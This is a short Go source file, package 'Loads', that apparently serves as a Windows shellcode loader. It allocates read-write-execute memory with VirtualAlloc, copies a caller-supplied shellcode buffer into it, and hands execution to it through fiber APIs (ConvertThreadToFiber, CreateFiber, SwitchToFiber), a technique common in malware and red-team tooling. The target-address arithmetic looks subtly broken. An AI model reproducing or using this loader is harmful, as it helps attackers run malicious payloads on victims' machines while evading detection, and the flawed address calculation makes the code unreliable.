package Loads

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT                  = 0x1000
	MEM_RESERVE                 = 0x2000
	PAGE_EXECUTE_READWRITE      = 0x40
	NULL                        = 0
	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	CreateFiber          = kernel32.MustFindProc("CreateFiber")
	SwitchToFiber        = kernel32.MustFindProc("SwitchToFiber")
	ConvertThreadToFiber = kernel32.MustFindProc("ConvertThreadToFiber")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	ConvertThreadToFiber.Call(NULL)
	var dummy func()
	lpFiber, _, _ := CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&dummy)), NULL)

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	tgtFuncAddr := lpFiber + uintptr(0xB0) + addr
	SwitchToFiber.Call(tgtFuncAddr)
}
